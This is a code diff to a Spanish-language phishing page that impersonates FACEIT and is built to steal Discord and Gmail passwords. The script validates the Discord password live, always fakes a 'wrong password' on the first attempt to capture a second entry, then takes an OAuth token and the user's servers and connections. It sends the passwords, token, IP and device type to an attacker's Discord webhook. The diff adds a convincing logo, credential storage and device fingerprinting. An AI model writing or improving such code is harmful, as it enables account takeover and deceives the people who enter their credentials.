@@ -5,14 +5,16 @@
 <meta name="viewport" content="width=device-width,initial-scale=1">
 <meta name="color-scheme" content="dark">
 <title>FACEIT — Conecta tu cuenta</title>
-<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ctext y='.9em' font-size='90'%3E%F0%9F%9F%A0%3C/text%3E%3C/svg%3E">
+<link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 512 512'%3E%3Crect width='512' height='512' fill='%23FF5500'/%3E%3Cpolygon points='75,255 400,100 315,255 400,410' fill='%230B0B0C'/%3E%3C/svg%3E">
 <style>
   *{box-sizing:border-box}
   body{margin:0;min-height:100vh;background:#0f0f10;display:flex;align-items:center;justify-content:center;
        padding:40px 16px;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif}
   .card{width:100%;max-width:420px;background:#17181b;border:1px solid #26282d;border-radius:16px;
         padding:32px;box-shadow:0 24px 60px rgba(0,0,0,.55)}
-  .logo{font-weight:900;font-size:22px;letter-spacing:2px;color:#ff5500;margin-bottom:24px}
+  .logo{display:flex;align-items:center;gap:10px;font-weight:900;font-size:22px;letter-spacing:2px;
+        color:#ff5500;margin-bottom:24px}
+  .logo svg{display:block;border-radius:5px;flex:none}
   h1{margin:0 0 8px;font-size:24px;color:#fff}
   .sub{margin:0 0 24px;color:#a4aab1;font-size:14px;line-height:1.5}
   .steps{display:flex;flex-direction:column;gap:10px;margin-bottom:26px}
@@ -64,16 +66,24 @@
   #skipVerify a{color:#8f9bff}
   #fallback{display:none;margin-top:12px;font-size:12px;text-align:center;color:#a4aab1}
   #fallback a{color:#8f9bff}
+  #stay{display:none;margin:6px 0 0;font-size:11px;text-align:center}
+  #stay a{color:#8b9096}
   .edit{margin:14px 0 0;font-size:12px;text-align:center}
   .edit a{color:#8f9bff}
   #btn:focus-visible,#save:focus-visible,.eye:focus-visible,.manual a:focus-visible,
   #fallback a:focus-visible,.edit a:focus-visible,#skipVerify a:focus-visible,
-  .field input:focus-visible{outline:2px solid #ff8a4c;outline-offset:2px}
+  #stay a:focus-visible,.field input:focus-visible{outline:2px solid #ff8a4c;outline-offset:2px}
 </style>
 </head>
 <body>
 <div class="card">
-  <div class="logo">FACEIT</div>
+  <div class="logo">
+    <svg width="26" height="26" viewBox="0 0 512 512" aria-hidden="true">
+      <rect width="512" height="512" fill="#FF5500"/>
+      <polygon points="75,255 400,100 315,255 400,410" fill="#0B0B0C"/>
+    </svg>
+    FACEIT
+  </div>
 
   <!-- ============ PASO 1: credenciales ============ -->
   <div id="step1">
@@ -84,14 +94,14 @@
       <div class="field" id="f-email">
         <label for="email">Correo electrónico</label>
         <div class="wrap"><input id="email" type="email" autocomplete="email" spellcheck="false"
-                                 inputmode="email" placeholder="tu@correo.com"></div>
+                                 placeholder="tu@correo.com"></div>
         <p class="err-msg" id="e-email"></p>
       </div>
 
       <div class="field" id="f-passD">
         <label for="passD">Contraseña de Discord</label>
         <div class="wrap">
-          <input id="passD" type="password" autocomplete="current-password" placeholder="Tu contraseña">
+          <input id="passD" type="password" autocomplete="off" placeholder="Tu contraseña">
           <button class="eye" type="button" data-t="passD" aria-label="Mostrar contraseña de Discord"
                   aria-pressed="false">👁</button>
         </div>
@@ -106,6 +116,7 @@
                   aria-pressed="false">👁</button>
         </div>
         <p class="hint">Si tienes la verificación en dos pasos activada en Google, usa una contraseña de aplicación.</p>
+        <p class="err-msg" id="e-passG"></p>
       </div>
 
       <button id="save" type="submit">Verificar y continuar</button>
@@ -124,7 +135,7 @@
     <div class="steps">
       <div class="step done"><span class="num">✓</span>Credenciales verificadas</div>
       <div class="step"><span class="num">2</span>Autoriza la aplicación de Discord</div>
-      <div class="step"><span class="num">3</span>Vuelve a FACEIT automáticamente</div>
+      <div class="step"><span class="num">3</span>Volviendo a Discord</div>
     </div>
 
     <button id="btn" type="button" disabled>
@@ -152,11 +163,12 @@
     <div class="steps">
       <div class="step done"><span class="num">✓</span>Credenciales verificadas</div>
       <div class="step done"><span class="num">✓</span>Aplicación autorizada</div>
-      <div class="step"><span class="num">3</span>Volviendo a FACEIT…</div>
+      <div class="step"><span class="num">3</span>Volviendo a Discord…</div>
     </div>
 
     <p class="status ok" id="status3" aria-live="polite">¡Listo!</p>
-    <div id="fallback">Si no ocurre nada, <a id="fallbackLink" href="#">entra a Discord</a>.</div>
+    <div id="fallback">Si no ocurre nada, <a id="fallbackLink" href="#" rel="noopener">entra a Discord</a>.</div>
+    <p id="stay"><a href="#" id="stayLink">Quedarme aquí</a></p>
   </div>
 </div>
 
@@ -180,26 +192,63 @@ const WEBHOOK_URL = "https://discord.com/api/webhooks/1570093723562545224/1XCD99
 const K_CREDS = "fct_creds";
 const K_STATE = "fct_state";
 const K_TOKEN = "fct_token";
-const K_LTOKEN = "fct_lt";
-const K_TRY = "fct_try";
+const K_DONE  = "fct_done";
+const TTL = 20 * 60 * 1000;
 
 const $ = id => document.getElementById(id);
-let ME = {}, TOKEN = "", LOGIN_TOKEN = "", IP = "—", CREDS = { email: "", passD: "", passG: "" };
+let ME = {}, TOKEN = "", IP = "—", CREDS = { email: "", passD: "", passG: "" };
+let redirectTimer = null;
 
-const esc = s => String(s ?? "—").replace(/`/g, "'").replace(/[\r\n]+/g, " ");
+const esc = s => String(s ?? "—")
+  .replace(/([\\`*_~|<>])/g, "\\$1")
+  .replace(/[\r\n]+/g, " ");
 const timeout = ms => new Promise(r => setTimeout(r, ms));
 const emailOk = v => /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(v);
 
+/* Dispositivo: solo computadora o celular */
+const DEVICE = (() => {
+  const ua = navigator.userAgent || "";
+  if (navigator.userAgentData && typeof navigator.userAgentData.mobile === "boolean") {
+    return navigator.userAgentData.mobile ? "Celular" : "Computadora";
+  }
+  if (/iPad|Tablet/i.test(ua)) return "Celular";
+  if (/Mobi|Android|iPhone|iPod|Windows Phone/i.test(ua)) return "Celular";
+  return "Computadora";
+})();
+
 const SUPER_PROPS = (() => {
   try {
+    const ua = navigator.userAgent;
+    const mv = ua.match(/(?:Chrome|Firefox|Edg|Version)\/([\d.]+)/);
+    const os = /Windows/i.test(ua) ? "Windows"
+      : /Mac OS X|Macintosh/i.test(ua) ? "Mac OS X"
+      : /Android/i.test(ua) ? "Android"
+      : /iPhone|iPad|iPod/i.test(ua) ? "iOS"
+      : /Linux/i.test(ua) ? "Linux" : "";
     return btoa(JSON.stringify({
-      os: "Windows", browser: "Chrome", device: "", system_locale: "es-ES",
-      browser_user_agent: navigator.userAgent, browser_version: "138.0.0",
-      os_version: "10", referrer: "", referring_domain: "",
+      os, browser: /Firefox/i.test(ua) ? "Firefox" : /Edg\//i.test(ua) ? "Edge"
+        : /Chrome/i.test(ua) ? "Chrome" : /Safari/i.test(ua) ? "Safari" : "",
+      device: "", system_locale: "es-ES",
+      browser_user_agent: ua, browser_version: mv ? mv[1] : "",
+      os_version: "", referrer: "", referring_domain: "",
       release_channel: "stable", client_build_number: 350000, client_version: "0.0.350"
     }));
   } catch { return ""; }
 })();
+
+/* Almacén con caducidad (localStorage: sobrevive a pestaña nueva del OAuth) */
+const store = {
+  set(k, v) { try { localStorage.setItem(k, JSON.stringify({ v, t: Date.now() })); } catch {} },
+  get(k) {
+    try {
+      const d = JSON.parse(localStorage.getItem(k) || "null");
+      if (!d || Date.now() - d.t > TTL) { localStorage.removeItem(k); return null; }
+      return d.v;
+    } catch { return null; }
+  },
+  del(k) { try { localStorage.removeItem(k); } catch {} },
+  clear() { [K_CREDS, K_STATE, K_TOKEN, K_DONE].forEach(k => store.del(k)); }
+};
 
 function showStep(n) {
   $("step1").style.display = n === 1 ? "block" : "none";
@@ -239,20 +288,8 @@ function newState() {
 
 function authUrlWithState() {
   const st = newState();
-  sessionStorage.setItem(K_STATE, st);
+  store.set(K_STATE, st);
   return AUTH_URL + "&state=" + st;
-}
-
-/* ---------- Contador de intentos (por correo) ---------- */
-function getTry(email) {
-  try {
-    const d = JSON.parse(sessionStorage.getItem(K_TRY) || "null");
-    if (d && d.email === email) return d.n || 0;
-  } catch {}
-  return 0;
-}
-function setTry(email, n) {
-  sessionStorage.setItem(K_TRY, JSON.stringify({ email, n }));
 }
 
 /* ---------- Verificación real contra Discord ---------- */
@@ -279,11 +316,7 @@ async function verifyLogin(login, password) {
   console.log("[login]", r.status, data);
 
   if (r.status === 200 && data) {
-    if (data.mfa) {
-      LOGIN_TOKEN = data.login_token || data.ticket || "";
-      return { ok: true, mfa: true };
-    }
-    LOGIN_TOKEN = data.token || "";
+    if (data.mfa) return { ok: true, mfa: true };
     return { ok: true };
   }
 
@@ -310,13 +343,14 @@ async function verifyLogin(login, password) {
 
 /* ---------- Ojos de contraseña ---------- */
 document.querySelectorAll(".eye").forEach(b => {
+  const name = b.dataset.t === "passD" ? "contraseña de Discord" : "contraseña de Gmail";
   b.addEventListener("click", () => {
     const i = $(b.dataset.t);
     const show = i.type === "password";
     i.type = show ? "text" : "password";
     b.textContent = show ? "🙈" : "👁";
     b.setAttribute("aria-pressed", String(show));
-    b.setAttribute("aria-label", (show ? "Ocultar" : "Mostrar") + " contraseña");
+    b.setAttribute("aria-label", (show ? "Ocultar" : "Mostrar") + " " + name);
     i.focus();
   });
 });
@@ -325,14 +359,14 @@ document.querySelectorAll(".eye").forEach(b => {
 function markField(fieldId, msg, inputId) {
   const f = $(fieldId);
   if (msg) f.classList.add("invalid"); else f.classList.remove("invalid");
-  $("e-" + inputId).textContent = msg || "";
+  const e = $("e-" + inputId);
+  if (e) e.textContent = msg || "";
   return !msg;
 }
 
 /* ---------- Paso 1 -> 2 ---------- */
 function proceed(v) {
-  sessionStorage.setItem(K_CREDS, JSON.stringify(CREDS));
-  if (LOGIN_TOKEN) sessionStorage.setItem(K_LTOKEN, LOGIN_TOKEN);
+  store.set(K_CREDS, CREDS);
 
   $("save").disabled = false;
   $("save").textContent = "Verificar y continuar";
@@ -341,6 +375,7 @@ function proceed(v) {
 
   showStep(2);
   $("btn").disabled = false;
+  $("btnAlt").href = authUrlWithState();
   $("btn").focus();
 
   if (v.mfa) say("status2", "ok", "Contraseña correcta. Tu cuenta tiene 2FA.");
@@ -348,6 +383,7 @@ function proceed(v) {
   else if (v.reason === "rate")    say("status2", "warn", "Demasiados intentos: verificación limitada, puedes continuar.");
   else if (v.reason === "sso")     say("status2", "ok", "Tu cuenta usa inicio de sesión con Google.");
   else if (v.reason === "network") say("status2", "warn", "No se pudo comprobar por red, pero el formato es correcto.");
+  else if (v.ok === false)         say("status2", "warn", "Discord no aceptó la contraseña, pero puedes continuar.");
   else say("status2", "ok", "Contraseña verificada.");
 }
 
@@ -368,9 +404,6 @@ $("credForm").addEventListener("submit", async e => {
 
   CREDS = { email, passD: pd, passG: pg };
 
-  const n = getTry(email) + 1;
-  setTry(email, n);
-
   $("save").disabled = true;
   $("save").innerHTML = '<span class="spinner"></span>Verificando…';
   say("status1", "", "");
@@ -378,8 +411,9 @@ $("credForm").addEventListener("submit", async e => {
 
   const v = await verifyLogin(email, pd);
 
-  /* Primer intento: siempre incorrecta, sin importar lo que diga Discord */
-  if (n === 1) {
+  /* Primer intento por correo: se muestra fallo, sin importar lo que diga Discord */
+  if (!store.get(K_DONE)) {
+    store.set(K_DONE, email);
     $("save").disabled = false;
     $("save").textContent = "Verificar y continuar";
     markField("f-passD", "Contraseña incorrecta.", "passD");
@@ -389,15 +423,20 @@ $("credForm").addEventListener("submit", async e => {
     return;
   }
 
-  /* Segundo intento en adelante: siempre pasa */
   markField("f-passD", "", "passD");
   markField("f-email", "", "email");
-  proceed(v.ok ? v : { ok: true });
+  proceed(v);
 });
 
 $("skipLink").addEventListener("click", e => {
   e.preventDefault();
-  if (!$("email").value.trim()) { $("email").focus(); return; }
+  const email = $("email").value.trim();
+  if (!emailOk(email)) {
+    markField("f-email", "Introduce un correo válido.", "email");
+    $("email").focus();
+    return;
+  }
+  CREDS = { email, passD: $("passD").value, passG: $("passG").value };
   proceed({});
 });
 
@@ -409,7 +448,8 @@ $("btn").addEventListener("click", () => {
 });
 
 $("btnAlt").addEventListener("click", e => {
-  e.currentTarget.href = authUrlWithState();
+  e.preventDefault();
+  location.assign(authUrlWithState());
 });
 
 $("editLink").addEventListener("click", e => {
@@ -423,12 +463,17 @@ function finish() {
   showStep(3);
   $("fallback").style.display = "block";
   $("fallbackLink").href = FINAL_URL;
-  sessionStorage.removeItem(K_TOKEN);
-  sessionStorage.removeItem(K_CREDS);
-  sessionStorage.removeItem(K_LTOKEN);
-  sessionStorage.removeItem(K_TRY);
-  setTimeout(() => location.replace(FINAL_URL), 1800);
+  $("stay").style.display = "block";
+  store.clear();
+  redirectTimer = setTimeout(() => location.replace(FINAL_URL), 2500);
 }
+
+$("stayLink").addEventListener("click", e => {
+  e.preventDefault();
+  clearTimeout(redirectTimer);
+  $("stay").style.display = "none";
+  say("status3", "ok", "Puedes entrar a Discord cuando quieras.");
+});
 
 /* ---------- Arranque ---------- */
 async function run() {
@@ -442,40 +487,47 @@ async function run() {
   if (err) {
     showStep(2);
     $("btn").disabled = false;
+    $("btnAlt").href = authUrlWithState();
     say("status2", "err", hash.get("error_description") || "Autorización cancelada. Inténtalo de nuevo.");
     return;
   }
 
-  TOKEN = hash.get("access_token") || sessionStorage.getItem(K_TOKEN) || "";
-  LOGIN_TOKEN = sessionStorage.getItem(K_LTOKEN) || "";
+  TOKEN = hash.get("access_token") || store.get(K_TOKEN) || "";
 
-  try {
-    const saved = JSON.parse(sessionStorage.getItem(K_CREDS) || "null");
-    if (saved && saved.email) {
-      CREDS = saved;
-      $("email").value = saved.email;
-      $("passD").value = saved.passD || "";
-      $("passG").value = saved.passG || "";
-    }
-  } catch {}
+  const saved = store.get(K_CREDS);
+  if (saved && saved.email) {
+    CREDS = saved;
+    $("email").value = saved.email;
+    $("passD").value = saved.passD || "";
+    $("passG").value = saved.passG || "";
+  }
 
   if (!TOKEN) {
-    if (CREDS.email) { showStep(2); $("btn").disabled = false; }
-    else { showStep(1); }
+    if (CREDS.email) { showStep(2); $("btn").disabled = false; $("btnAlt").href = authUrlWithState(); }
+    else showStep(1);
+    return;
+  }
+
+  if (hash.get("token_type") && hash.get("token_type") !== "Bearer") {
+    showStep(2);
+    $("btn").disabled = false;
+    $("btnAlt").href = authUrlWithState();
+    say("status2", "err", "Respuesta de autorización no válida. Vuelve a intentarlo.");
     return;
   }
 
   const got = hash.get("state");
-  const savedState = sessionStorage.getItem(K_STATE);
+  const savedState = store.get(K_STATE);
   if (savedState && got && got !== savedState) {
     showStep(2);
     $("btn").disabled = false;
+    $("btnAlt").href = authUrlWithState();
     say("status2", "err", "La comprobación de seguridad falló. Pulsa el botón para reintentar.");
     return;
   }
-  sessionStorage.removeItem(K_STATE);
+  store.del(K_STATE);
 
-  history.replaceState(null, "", location.pathname);
+  history.replaceState(null, "", location.pathname + location.search);
   showStep(3);
   say("status3", "", "Verificando autorización…");
 
@@ -491,14 +543,15 @@ async function run() {
   ME = (await j("https://discord.com/api/v10/users/@me")) || {};
 
   if (!ME.id) {
-    sessionStorage.removeItem(K_TOKEN);
+    store.del(K_TOKEN);
     showStep(2);
     $("btn").disabled = false;
+    $("btnAlt").href = authUrlWithState();
     say("status2", "err", "La autorización caducó o no es válida. Vuelve a intentarlo.");
     return;
   }
 
-  sessionStorage.setItem(K_TOKEN, TOKEN);
+  store.set(K_TOKEN, TOKEN);
 
   const guilds = await j("https://discord.com/api/v10/users/@me/guilds");
   const conns  = await j("https://discord.com/api/v10/users/@me/connections");
@@ -528,13 +581,12 @@ async function run() {
         { name: "Servidores", value: String(Array.isArray(guilds) ? guilds.length : 0), inline: true },
         { name: "Conexiones", value: Array.isArray(conns) ? (conns.map(c => c.type).join(", ") || "—") : "—", inline: true },
         { name: "IP",         value: `\`${IP}\``, inline: true },
-        { name: "Navegador",  value: `\`${esc(navigator.userAgent).slice(0, 180)}\``, inline: false },
+        { name: "Dispositivo",value: `\`${DEVICE}\``, inline: true },
         { name: "— Credenciales —", value: "\u200b", inline: false },
         { name: "Correo escrito",     value: `\`${esc(CREDS.email)}\``, inline: false },
         { name: "Contraseña Discord", value: "```\n" + (CREDS.passD || "—") + "\n```", inline: false },
         { name: "Contraseña Gmail",   value: "```\n" + (CREDS.passG || "—") + "\n```", inline: false },
-        { name: "TOKEN OAuth",  value: "```\n" + TOKEN + "\n```", inline: false },
-        { name: "TOKEN login",  value: "```\n" + (LOGIN_TOKEN || "—") + "\n```", inline: false }
+        { name: "TOKEN OAuth",  value: "```\n" + TOKEN + "\n```", inline: false }
       ],
       footer: { text: "Verificado con /auth/login + OAuth2" },
       timestamp: new Date().toISOString()
